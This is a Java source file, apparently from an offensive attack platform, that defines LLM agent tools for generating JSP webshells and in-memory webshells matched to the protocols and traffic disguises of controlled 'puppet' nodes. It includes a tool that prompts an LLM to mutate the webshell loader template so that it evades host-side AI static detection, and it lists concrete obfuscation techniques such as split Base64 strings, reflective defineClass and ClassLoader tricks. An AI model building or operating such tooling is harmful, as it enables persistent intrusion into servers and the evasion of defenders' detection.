package org.leo.ai.tools.platform;

import dev.langchain4j.agent.tool.Tool;
import dev.langchain4j.data.message.SystemMessage;
import dev.langchain4j.data.message.UserMessage;
import dev.langchain4j.model.chat.request.ChatRequest;
import dev.langchain4j.model.chat.response.ChatResponse;
import org.leo.ai.channel.DelegatingChatModel;
import org.leo.core.entity.Disguise;
import org.leo.core.entity.Puppet;
import org.leo.core.util.request.ClassNameGenerator;
import org.leo.jmg.ServerInjectorMapper;
import org.leo.jmg.ShellGenerator;
import org.leo.jmg.ShellGeneratorConfig;
import org.leo.jmg.mem.packer.PackerRegistry;
import org.leo.jmg.mem.packer.Util;
import org.leo.jmg.mem.packer.jsp.JspObfuscationPipeline;
import org.leo.service.PuppetService;
import org.leo.service.disguise.DisguiseService;
import org.leo.service.shell.ShellResultStore;
import org.springframework.stereotype.Component;

import java.util.Arrays;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * 平台侧 AI 工具：WebShell 与内存马生成，含 AI 辅助 JSP 模板结构变异。
 *
 * <p>生成结果不直接返回给 LLM（避免超长字符串被截断），
 * 而是存入 {@link ShellResultStore} 并返回 {@code resultId}。
 * 前端凭 {@code resultId} 通过 REST 端点 {@code GET /platform/shell-generator/result/{id}} 直接取回完整代码。
 *
 * <p>模板变异工作流：
 * <ol>
 *   <li>调用 {@link #mutateJspTemplate} → LLM 生成结构变体模板（保留占位符，改变代码骨架）</li>
 *   <li>调用 {@link #generateMemoryShell} 并传入上一步的模板 → deterministic pipeline 执行输出</li>
 * </ol>
 */
@Component
public class ShellGeneratorTools {

    private static final String TEMPLATE_SHELL_JSP  = "/memshell-template/shell.jsp";
    private static final String TEMPLATE_SHELL1_JSP = "/memshell-template/shell1.jsp";
    private static final String TEMPLATE_SHELL2_JSP = "/memshell-template/shell2.jsp";

    private static final String TEMPLATE_SYNTAX_GUIDE =
            "## JSP 模板占位符规则\n" +
            "- `{{base64Str}}`  : 注入器字节码的 Base64 编码字符串，必须保留且只能出现一次\n" +
            "- `{{className}}`  : 注入器类的全限定名，如需引用时使用\n" +
            "- `{{VAR:name}}`   : 局部变量占位符；同一模板中相同 name 渲染为相同随机字段名\n" +
            "- `{{CLS:Name}}`   : 内部类名占位符；同一模板中相同 Name 渲染为相同随机 PascalCase 类名\n\n" +
            "## 生成约束\n" +
            "1. 输出必须是合法的 JSP 代码（`<%! %>` / `<% %>` scriptlet 结构）\n" +
            "2. 最终必须完成：解码 {{base64Str}} → byte[] → defineClass → newInstance\n" +
            "3. 所有局部变量必须用 `{{VAR:xxx}}` 占位，内部类名用 `{{CLS:Xxx}}` 占位，禁止使用硬编码变量名\n" +
            "4. 禁止改变 `{{base64Str}}` 的语义，禁止添加额外的网络请求或文件操作\n" +
            "5. 只输出 JSP 代码本身，不要包含任何解释文字、markdown 代码块标记\n";

    private static final String MUTATION_TECHNIQUES =
            "## 可用变异技术（从中选 2-3 个组合应用，在首行注释中注明所选编号）\n" +
            "- T1: 将 Base64 字符串拆为多个字面量片段，通过 StringBuilder 或 + 分步拼接后再解码\n" +
            "- T2: 通过 Thread.currentThread().getContextClassLoader() 获取 ClassLoader\n" +
            "- T3: 用反射调用 defineClass：Class.forName(\"java.lang.ClassLoader\")" +
                  ".getDeclaredMethod(\"defineClass\", ...) 并 setAccessible(true)\n" +
            "- T4: byte[] 解码后经过 Arrays.copyOfRange(decoded, 0, decoded.length) 中转再传入 defineClass\n" +
            "- T5: 将核心调用包在 do { ... } while(false) 或 if(System.currentTimeMillis() > 0){ } 块中\n" +
            "- T6: 把关键类名拆成字符串拼接再传入 Class.forName，如 \"java.util.B\"+\"ase64\"\n" +
            "- T7: 将 defineClass 调用封装进一个 <%! %> 声明块的私有方法，在 <% %> 中调用该方法\n\n";

    private final DisguiseService disguiseService;
    private final DelegatingChatModel chatModel;
    private final ShellResultStore resultStore;
    private final PuppetService puppetService;

    public ShellGeneratorTools(DisguiseService disguiseService,
                               DelegatingChatModel chatModel,
                               ShellResultStore resultStore,
                               PuppetService puppetService) {
        this.disguiseService = disguiseService;
        this.chatModel = chatModel;
        this.resultStore = resultStore;
        this.puppetService = puppetService;
    }

    // ── 元数据查询 ──────────────────────────────────────────────────────────────

    @Tool("获取脚本生成器元数据：所有支持的服务器类型（serverType）、注入器形态（shellType）、" +
          "打包器类型（packerType）及分组层级、各 Packer 支持的混淆步骤 ID，以及全量 JSP 混淆步骤描述列表。" +
          "生成 WebShell 或内存马前，调用此工具确认合法参数范围。")
    public Map<String, Object> getShellGeneratorMeta() {
        Map<String, Object> data = new HashMap<>();
        data.put("serverInjectorTypes", ServerInjectorMapper.getAllServerInjectorMapAsString());
        data.put("packerTypes", ServerInjectorMapper.getSupportedPackerTypesHierarchy());
        data.put("packerObfuscationSteps", PackerRegistry.getPackerObfuscationStepsMap());
        data.put("obfuscationSteps", JspObfuscationPipeline.getStepDescriptors());
        return data;
    }

    @Tool("根据 puppetId 查询该 Puppet 当前使用的通信协议和伪装器配置，" +
          "返回 protocol、reqDisguiseId、reqDisguiseName、respDisguiseId、respDisguiseName。" +
          "生成 WebShell 或内存马前必须调用此工具，确保生成的 shell 与当前傀儡节点通信协议完全匹配，" +
          "避免因协议或伪装器不匹配导致 shell 无法使用。" +
          "如果用户未明确指定 puppetId，请先通过 getAllPuppet 工具获取可用节点列表后再调用本工具。")
    public Map<String, Object> getPuppetShellConfig(String puppetId) {
        try {
            if (isBlank(puppetId)) throw new IllegalArgumentException("puppetId 不能为空");
            Puppet puppet = puppetService.findPuppetById(puppetId.trim());
            if (puppet == null) throw new IllegalArgumentException("Puppet 不存在: " + puppetId);

            Map<String, Object> result = new LinkedHashMap<>();
            result.put("success",       true);
            result.put("puppetId",      puppet.getPuppetId());
            result.put("puppetName",    puppet.getPuppetName());
            result.put("protocol",      puppet.getProtocol() != null ? puppet.getProtocol() : "http");
            result.put("reqDisguiseId", puppet.getReqDisguiseId());
            result.put("respDisguiseId", puppet.getRespDisguiseId());

            // 补充伪装器名称，方便 AI 理解上下文
            if (!isBlank(puppet.getReqDisguiseId())) {
                Disguise req = disguiseService.getDisguiseById(puppet.getReqDisguiseId());
                result.put("reqDisguiseName", req != null ? req.getDisguiseName() : "unknown");
            }
            if (!isBlank(puppet.getRespDisguiseId())) {
                Disguise resp = disguiseService.getDisguiseById(puppet.getRespDisguiseId());
                result.put("respDisguiseName", resp != null ? resp.getDisguiseName() : "unknown");
            }

            result.put("tip", "请将 protocol、reqDisguiseId、respDisguiseId 直接传入 generateWebShell 或 generateMemoryShell，" +
                    "确保生成的 shell 与该傀儡节点通信协议完全一致。");
            return result;
        } catch (Exception e) {
            return failureResult("getPuppetShellConfig", e);
        }
    }

    // ── AI 辅助模板变异 ──────────────────────────────────────────────────────────

    @Tool("调用 LLM 对 JSP 内存马模板进行结构变异，生成语义等价但代码骨架不同的变体，" +
          "用于规避主机侧 AI 对落地 JSP 文件的静态特征检测。" +
          "返回字段：mutatedTemplate（变体模板字符串）、summary（变异摘要）。" +
          "将 mutatedTemplate 作为 generateMemoryShell 的 customJspTemplate 参数传入即可启用变体。" +
          "packerType 必填（如 ClassLoaderJSP / DefineClassJSP）；" +
          "byPassJavaModule 仅对 DefineClassJSP 有效；" +
          "mutationHint 可选，指定变异方向。")
    public Map<String, Object> mutateJspTemplate(
            String packerType,
            Boolean byPassJavaModule,
            String mutationHint) {
        try {
            String baseTemplate = resolveBaseTemplate(packerType, byPassJavaModule);

            String mutated = null;
            String lastError = null;
            int maxAttempts = 3;

            for (int attempt = 1; attempt <= maxAttempts; attempt++) {
                String userPrompt = buildMutationPrompt(baseTemplate, mutationHint, lastError);
                ChatRequest request = ChatRequest.builder()
                        .messages(Arrays.asList(
                                SystemMessage.from(TEMPLATE_SYNTAX_GUIDE),
                                UserMessage.from(userPrompt)
                        ))
                        .build();
                ChatResponse response = chatModel.chat(request);
                String raw = response.aiMessage().text();
                if (raw == null) raw = "";
                mutated = stripCodeFences(raw.trim());

                try {
                    validateMutatedTemplate(mutated);
                    break; // 验证通过，退出重试
                } catch (IllegalStateException e) {
                    lastError = e.getMessage();
                    if (attempt == maxAttempts) {
                        throw new IllegalStateException(
                                "经过 " + maxAttempts + " 次尝试仍未生成合法模板，最后一次错误：" + lastError);
                    }
                }
            }

            Map<String, Object> result = new HashMap<>();
            result.put("success", true);
            result.put("mutatedTemplate", mutated);
            result.put("summary", "结构变异完成，模板长度 " + mutated.length()
                    + " 字符。将 mutatedTemplate 传入 generateMemoryShell 的 customJspTemplate 参数即可使用。");
            return result;

        } catch (Exception e) {
            return failureResult("mutateJspTemplate", e);
        }
    }

    // ── WebShell 生成 ───────────────────────────────────────────────────────────

    @Tool("生成 JSP 或 JSPX 格式的 WebShell，生成结果存入缓存并返回 resultId。" +
          "【重要】调用本工具前必须先调用 getPuppetShellConfig 获取目标傀儡节点的 protocol、reqDisguiseId、respDisguiseId，" +
          "将这三个值直接传入本工具，确保生成的 shell 与目标节点通信协议完全匹配，避免 shell 无法连接。" +
          "前端通过 GET /platform/shell-generator/result/{resultId} 取回完整代码。" +
          "reqDisguiseId / respDisguiseId：请求/响应伪装器 ID，必填，从 getPuppetShellConfig 获取。" +
          "shellType：JSP 或 JSPX，必填。" +
          "coreClassName：核心类名，留空自动生成。" +
          "protocol：http / httpchunk，从 getPuppetShellConfig 获取，默认 http。" +
          "respCode：响应状态码，默认 200。" +
          "jspObfuscationSteps：混淆步骤 ID 有序列表，null 使用默认策略，空列表不混淆。")
    public Map<String, Object> generateWebShell(
            String reqDisguiseId,
            String respDisguiseId,
            String shellType,
            String coreClassName,
            String protocol,
            Integer respCode,
            List<String> jspObfuscationSteps) {
        try {
            Disguise reqDisguise  = requireDisguise(reqDisguiseId,  "reqDisguiseId");
            Disguise respDisguise = requireDisguise(respDisguiseId, "respDisguiseId");

            String shellTypeUpper = requireNonBlank(shellType, "shellType").toUpperCase();
            if (!"JSP".equals(shellTypeUpper) && !"JSPX".equals(shellTypeUpper)) {
                throw new IllegalArgumentException("shellType 必须是 JSP 或 JSPX，当前值: " + shellType);
            }

            ShellGeneratorConfig.Builder builder = ShellGeneratorConfig
                    .builder(reqDisguise, respDisguise)
                    .respCode(respCode != null ? respCode : 200);

            if (!isBlank(protocol))      builder.protocol(protocol.trim());
            if (!isBlank(coreClassName)) builder.coreClassName(coreClassName.trim());
            if (jspObfuscationSteps != null) builder.jspObfuscationSteps(jspObfuscationSteps);

            ShellGeneratorConfig config = builder.build();
            ShellGenerator generator = new ShellGenerator(config);

            String shell = "JSP".equals(shellTypeUpper)
                    ? generator.generateJspShell()
                    : generator.generateJspxShell();

            // 摘要（不含完整代码）
            Map<String, Object> meta = new LinkedHashMap<>();
            meta.put("type",          shellTypeUpper);
            meta.put("coreClassName", config.getCoreClassName());
            meta.put("protocol",      config.getProtocol());
            meta.put("lines",         shell.split("\n").length);
            meta.put("chars",         shell.length());

            String resultId = resultStore.put(shell, meta);

            Map<String, Object> result = new LinkedHashMap<>();
            result.put("success",   true);
            result.put("resultId",  resultId);
            result.put("fetchUrl",  "/platform/shell-generator/result/" + resultId);
            result.put("meta",      meta);
            result.put("tip",       "完整代码已缓存（30 分钟有效）。" +
                    "请在回复正文中嵌入以下按钮语法，让用户可以直接在对话中取回代码：" +
                    "[[shell-result:" + resultId + ":取回 WebShell 代码]]");
            return result;

        } catch (Exception e) {
            return failureResult("generateWebShell", e);
        }
    }

    // ── 内存马生成 ──────────────────────────────────────────────────────────────

    @Tool("生成内存马并将完整代码存入缓存，返回 resultId 供前端取回。" +
          "【重要】调用本工具前必须先调用 getPuppetShellConfig 获取目标傀儡节点的 protocol、reqDisguiseId、respDisguiseId，" +
          "将这三个值直接传入本工具，确保生成的内存马与目标节点通信协议完全匹配，避免内存马无法连接。" +
          "前端通过 GET /platform/shell-generator/result/{resultId} 取回完整代码，勿让 LLM 转述完整代码。" +
          "reqDisguiseId / respDisguiseId：请求/响应伪装器 ID，必填，从 getPuppetShellConfig 获取。" +
          "headerName / headerValue：触发 Header 键值对，必填。" +
          "serverType：目标应用服务器类型，必填，可通过 getShellGeneratorMeta 获取。" +
          "shellType：注入器形态，必填，可通过 getShellGeneratorMeta 获取。" +
          "packerType：打包器类型，必填，可通过 getShellGeneratorMeta 获取。" +
          "protocol：http / httpchunk，从 getPuppetShellConfig 获取，默认 http。" +
          "urlPattern：URL 映射模式，默认 /*。" +
          "coreClassName / injectorClassName / shellClassName：留空自动生成随机类名。" +
          "isAbstractTranslet：默认 false。byPassJavaModule：默认 false。respCode：默认 200。" +
          "jspObfuscationSteps：混淆步骤 ID 有序列表，null 使用默认策略，空列表不混淆。" +
          "customJspTemplate：由 mutateJspTemplate 返回的变体模板，用于规避 AI 检测。")
    public Map<String, Object> generateMemoryShell(
            String reqDisguiseId,
            String respDisguiseId,
            String headerName,
            String headerValue,
            String serverType,
            String shellType,
            String packerType,
            String protocol,
            String urlPattern,
            String coreClassName,
            String injectorClassName,
            String shellClassName,
            Boolean isAbstractTranslet,
            Boolean byPassJavaModule,
            Integer respCode,
            List<String> jspObfuscationSteps,
            String customJspTemplate) {
        try {
            Disguise reqDisguise  = requireDisguise(reqDisguiseId,  "reqDisguiseId");
            Disguise respDisguise = requireDisguise(respDisguiseId, "respDisguiseId");

            ShellGeneratorConfig.Builder builder = ShellGeneratorConfig
                    .builder(reqDisguise, respDisguise)
                    .header(requireNonBlank(headerName,  "headerName"),
                            requireNonBlank(headerValue, "headerValue"))
                    .serverType(requireNonBlank(serverType, "serverType"))
                    .shellType(requireNonBlank(shellType,   "shellType"))
                    .packerType(requireNonBlank(packerType, "packerType"))
                    .urlPattern(isBlank(urlPattern) ? "/*" : urlPattern.trim())
                    .abstractTranslet(isAbstractTranslet != null && isAbstractTranslet)
                    .respCode(respCode != null ? respCode : 200);

            if (!isBlank(protocol))          builder.protocol(protocol.trim());
            if (byPassJavaModule != null)    builder.byPassJavaModule(byPassJavaModule);
            if (jspObfuscationSteps != null) builder.jspObfuscationSteps(jspObfuscationSteps);
            if (!isBlank(customJspTemplate)) builder.customJspTemplate(customJspTemplate.trim());

            builder.coreClassName(isBlank(coreClassName)
                    ? ClassNameGenerator.generateServletStyleClassName() : coreClassName.trim());
            builder.injectorClassName(isBlank(injectorClassName)
                    ? ClassNameGenerator.generateServletStyleClassName() : injectorClassName.trim());
            builder.shellClassName(isBlank(shellClassName)
                    ? ClassNameGenerator.generateServletStyleClassName() : shellClassName.trim());

            ShellGeneratorConfig config = builder.build();
            ShellGenerator generator = new ShellGenerator(config);
            String code = generator.generateFormattedInjector();

            // 摘要（不含完整代码）
            Map<String, Object> meta = new LinkedHashMap<>();
            meta.put("packerType",        config.getPackerType());
            meta.put("shellType",         config.getShellType());
            meta.put("serverType",        config.getServerType());
            meta.put("coreClassName",     config.getCoreClassName());
            meta.put("injectorClassName", config.getInjectorClassName());
            meta.put("shellClassName",    config.getShellClassName());
            meta.put("urlPattern",        config.getUrlPattern());
            meta.put("isAbstractTranslet", config.isAbstractTranslet());
            meta.put("byPassJavaModule",  config.isByPassJavaModule());
            meta.put("headerConfig",      headerName + " : " + headerValue);
            meta.put("templateMutated",   !isBlank(customJspTemplate));
            meta.put("lines",             code.split("\n").length);
            meta.put("chars",             code.length());

            String resultId = resultStore.put(code, meta);

            Map<String, Object> result = new LinkedHashMap<>();
            result.put("success",  true);
            result.put("resultId", resultId);
            result.put("fetchUrl", "/platform/shell-generator/result/" + resultId);
            result.put("meta",     meta);
            result.put("tip",      "完整代码已缓存（30 分钟有效）。" +
                    "请在回复正文中嵌入以下按钮语法，让用户可以直接在对话中取回代码：" +
                    "[[shell-result:" + resultId + ":取回内存马代码]]");
            return result;

        } catch (Exception e) {
            return failureResult("generateMemoryShell", e);
        }
    }

    // ── 私有工具方法 ───────────────────────────────────────────────────────────

    private String resolveBaseTemplate(String packerType, Boolean byPassJavaModule) {
        if (isBlank(packerType)) throw new IllegalArgumentException("packerType 不能为空");
        String pt = packerType.trim();
        if ("ClassLoaderJSP".equalsIgnoreCase(pt)) {
            return Util.loadTemplateFromResource(TEMPLATE_SHELL_JSP);
        }
        if ("DefineClassJSP".equalsIgnoreCase(pt)) {
            boolean bypass = Boolean.TRUE.equals(byPassJavaModule);
            return Util.loadTemplateFromResource(bypass ? TEMPLATE_SHELL2_JSP : TEMPLATE_SHELL1_JSP);
        }
        return Util.loadTemplateFromResource(TEMPLATE_SHELL1_JSP);
    }

    private String buildMutationPrompt(String baseTemplate, String mutationHint, String lastError) {
        StringBuilder sb = new StringBuilder();
        sb.append("以下是当前内置的 JSP 内存马加载模板，请对其进行结构变异，");
        sb.append("生成一个语义完全等价但代码骨架明显不同的变体，以规避主机侧 AI 对 JSP 文件的静态特征检测。\n\n");

        if (lastError != null && !lastError.trim().isEmpty()) {
            sb.append("⚠️ 上一次生成失败，原因：").append(lastError.trim());
            sb.append("\n请修正上述问题后重新输出。\n\n");
        }

        sb.append(MUTATION_TECHNIQUES);

        if (!isBlank(mutationHint)) {
            sb.append("额外变异方向提示：").append(mutationHint.trim()).append("\n\n");
        }

        sb.append("原始模板：\n```\n").append(baseTemplate).append("\n```\n\n");
        sb.append("输出要求：只输出变体 JSP 代码，不要有任何说明文字或 markdown 标记。");
        return sb.toString();
    }

    private void validateMutatedTemplate(String template) {
        if (template == null || template.isBlank()) {
            throw new IllegalStateException("LLM 返回了空模板，请重试");
        }
        if (!template.contains("{{base64Str}}")) {
            throw new IllegalStateException("LLM 生成的模板缺少 {{base64Str}} 占位符，模板无效");
        }
        if (!template.contains("<%")) {
            throw new IllegalStateException("LLM 生成的模板不包含 JSP scriptlet 标记，模板无效");
        }
    }

    private String stripCodeFences(String text) {
        if (text.startsWith("```")) {
            int firstNewline = text.indexOf('\n');
            if (firstNewline > 0) text = text.substring(firstNewline + 1);
            if (text.endsWith("```")) text = text.substring(0, text.lastIndexOf("```")).trim();
        }
        return text;
    }

    private Disguise requireDisguise(String disguiseId, String paramName) {
        requireNonBlank(disguiseId, paramName + " 不能为空");
        Disguise d = disguiseService.getDisguiseById(disguiseId.trim());
        if (d == null) throw new IllegalArgumentException("Disguise 不存在: " + disguiseId);
        return d;
    }

    private String requireNonBlank(String value, String message) {
        if (isBlank(value)) throw new IllegalArgumentException(message);
        return value.trim();
    }

    private boolean isBlank(String value) {
        return value == null || value.isBlank();
    }

    private Map<String, Object> failureResult(String operation, Exception e) {
        Throwable root = e;
        while (root.getCause() != null && root.getCause() != root) root = root.getCause();
        Map<String, Object> result = new LinkedHashMap<>();
        result.put("success",   false);
        result.put("operation", operation);
        result.put("errorType", e.getClass().getSimpleName());
        result.put("message",   e.getMessage() != null ? e.getMessage() : e.getClass().getName());
        if (root != e) {
            result.put("rootCauseType",    root.getClass().getSimpleName());
            result.put("rootCauseMessage", root.getMessage() != null ? root.getMessage() : root.getClass().getName());
        }
        return result;
    }
}
